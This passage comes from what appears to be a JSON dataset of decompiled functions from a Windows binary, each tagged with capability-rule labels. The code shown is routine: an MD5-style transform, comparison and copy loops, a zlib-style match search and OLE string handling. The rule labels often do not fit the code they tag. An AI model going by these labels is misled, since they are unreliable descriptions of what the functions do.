+ param_2[7] + *0x4927cc + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar6 * 0x400000 | uVar6 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x4927d0 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[9] + *0x4927d4 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x4927d8 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xb] + *0x4927dc + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x4927e0 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[0xd] + *0x4927e4 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x4927e8 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xf] + *0x4927ec + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x4927f0 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[6] + *0x4927f4 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + str.QZ._0_4_ + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + *param_2 + *0x4927fc + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x492800 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[10] + *0x492804 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x492808 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[4] + *0x49280c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x492810 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[0xe] + *0x492814 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x492818 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[8] + *0x49281c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x492820 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[2] + *0x492824 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x492828 + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[0xc] + *0x49282c + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x492830 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[8] + *0x492834 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + *0x492838 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[0xe] + *0x49283c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x492840 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[4] + *0x492844 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x492848 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[10] + *0x49284c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x492850 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + *param_2 + *0x492854 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x492858 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[6] + *0x49285c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x492860 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[0xc] + *0x492864 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x492868 + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[2] + *0x49286c + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + *param_2 + *0x492870 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[7] + *0x492874 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x492878 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[5] + *0x49287c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x492880 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x492884 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x492888 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x49288c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x492890 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xf] + *0x492894 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[6] + *0x492898 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[0xd] + *0x49289c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[4] + *0x4928a0 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xb] + *0x4928a4 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[2] + *0x4928a8 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[9] + *0x4928ac + ((~uVar4 | uVar2) ^ uVar3);\n    *in_EAX = *in_EAX + uVar4;\n    in_EAX[1] = in_EAX[1] + (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    in_EAX[2] = in_EAX[2] + uVar2;\n    in_EAX[3] = in_EAX[3] + uVar3;\n    return;\n}\n",
        "token_count": 4557
    },
    "004039c8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004039c8(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x00403a0b:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x00403a46:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x00403a46;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x00403a0b;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x00403a46;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 490
    },
    "00403a4c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403a4c(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00403a7c:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00403a7c;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 328
    },
    "0040465c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404691)\n// WARNING: Removing unreachable block (ram,0x00404697)\n// WARNING: Removing unreachable block (ram,0x0040469e)\n// WARNING: Removing unreachable block (ram,0x004046a4)\n// WARNING: Removing unreachable block (ram,0x004046aa)\n\nvoid __fastcall fcn.0040465c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    *param_2 = in_EAX;\n    uVar2 = *(in_EAX + -0x28);\n    uVar1 = uVar2 >> 2;\n    piVar3 = param_2 + 1;\n    while (uVar1 = uVar1 - 1,  uVar1 != 0) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (; *(in_EAX + -0x24) != NULL; in_EAX = **(in_EAX + -0x24)) {\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "00405ed4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ed4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "0040a8f4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a8f4(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 338
    },
    "0041d058": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d058(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041d0a4();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 401
    },
    "0041f50c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f50c(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041f558();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "00468848": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00468848(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    char cStack16;\n    char cStack15;\n    \n    uStack36 = *(in_EAX + 0x78);\n    uVar2 = *(in_EAX + 0x74);\n    pcVar3 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    if (*(in_EAX + 0x28) - 0x106U < *(in_EAX + 0x68)) {\n        uVar6 = *(in_EAX + 0x68) - (*(in_EAX + 0x28) + -0x106);\n    }\n    else {\n        uVar6 = 0;\n    }\n    cStack16 = pcVar3[uVar2 - 1];\n    pcVar5 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    cStack15 = pcVar3[uVar2];\n    if (*(in_EAX + 0x88) <= *(in_EAX + 0x74)) {\n        uStack36 = uStack36 >> 2;\n    }\n    uStack40 = param_2;\n    uStack32 = *(in_EAX + 0x8c);\n    if (*(in_EAX + 0x70) < *(in_EAX + 0x8c)) {\n        uStack32 = *(in_EAX + 0x70);\n    }\n    do {\n        pcVar8 = *(in_EAX + 0x34) + uStack40;\n        if ((((pcVar8[uVar2] == cStack15) && (pcVar8[uVar2 - 1] == cStack16)) && (*pcVar8 == *pcVar3)) &&\n           (pcVar8[1] == pcVar3[1])) {\n            pcVar8 = pcVar8 + 2;\n            pcVar3 = pcVar3 + 2;\n            while (((((pcVar4 = pcVar3 + 1,  *pcVar4 == pcVar8[1] && (pcVar4 = pcVar3 + 2,  *pcVar4 == pcVar8[2])) &&\n                     ((pcVar4 = pcVar3 + 3,  *pcVar4 == pcVar8[3] &&\n                      ((pcVar4 = pcVar3 + 4,  *pcVar4 == pcVar8[4] && (pcVar4 = pcVar3 + 5,  *pcVar4 == pcVar8[5]))))))\n                    && (pcVar4 = pcVar3 + 6,  *pcVar4 == pcVar8[6])) && (pcVar4 = pcVar3 + 7,  *pcVar4 == pcVar8[7]))) {\n                pcVar4 = pcVar3 + 8;\n                pcVar8 = pcVar8 + 8;\n                if ((*pcVar4 != *pcVar8) || (pcVar3 = pcVar4,  pcVar5 + 0x102 <= pcVar4)) break;\n            }\n            iVar1 = -((pcVar5 + 0x102) - pcVar4);\n            uVar7 = iVar1 + 0x102;\n            pcVar3 = pcVar5;\n            if (uVar2 < uVar7) {\n                *(in_EAX + 0x6c) = uStack40;\n                if (uStack32 <= uVar7) {\ncode_r0x004689a7:\n                    uVar2 = *(in_EAX + 0x70);\n                    if (uVar7 <= uVar2) {\n                        uVar2 = uVar7;\n                    }\n                    return uVar2;\n                }\n                cStack16 = pcVar5[iVar1 + 0x101];\n                cStack15 = pcVar5[uVar7];\n                uVar2 = uVar7;\n            }\n        }\n        uVar7 = uVar2;\n        uStack40 = *(*(in_EAX + 0x3c) + (uStack40 & *(in_EAX + 0x30)) * 2);\n        if ((uStack40 <= uVar6) || (uStack36 = uStack36 - 1,  uVar2 = uVar7,  uStack36 == 0)) goto code_r0x004689a7;\n    } while( true );\n}\n",
        "token_count": 1056
    },
    "00405758": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405758(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x00405781:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x0040577e:\n                piVar2 = piVar2 + 1;\n                goto code_r0x00405781;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x0040577e;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "004057d4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057d4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00405d64": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405d64(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX != param_2) {\n        if ((param_2 == 0) || (*(param_2 + -4) >> 1 == 0)) {\n            iVar1 = *in_EAX;\n            if (iVar1 != 0) {\n                *in_EAX = 0;\n                sub.oleaut32.dll_SysFreeString(iVar1);\n            }\n            return;\n        }\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 == 0) {\n            if (*0x495008 != NULL) {\n                (**0x495008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00405e6c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405e6c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x00405e95:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x00405e92:\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405e95;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405e92;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x495008 != NULL) {\n        (**0x495008)();\n    }\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 447
    },
    "00405ec8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00405ec8(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004064c0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004064c0(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    \n    uVar8 = param_2 >> 0x1f;\n    uVar3 = (in_EAX ^ uVar8) - uVar8;\n    uVar6 = ((param_2 ^ uVar8) - uVar8) - ((in_EAX ^ uVar8) < uVar8);\n    uVar8 = param_4 >> 0x1f;\n    uVar9 = (param_2 ^ param_4) >> 0x1f;\n    uVar7 = (param_3 ^ uVar8) - uVar8;\n    uVar8 = ((param_4 ^ uVar8) - uVar8) - ((param_3 ^ uVar8) < uVar8);\n    if (uVar8 == 0) {\n        if (uVar7 <= uVar6) {\n            uVar8 = uVar6 / uVar7;\n            uVar6 = uVar6 % uVar7;\n        }\n        uVar3 = CONCAT44(uVar6, uVar3) / uVar7;\n    }\n    else {\n        bVar10 = (uVar8 & 1) != 0;\n        iVar4 = 0x1f;\n        if (uVar8 != 0) {\n            for (; uVar8 >> 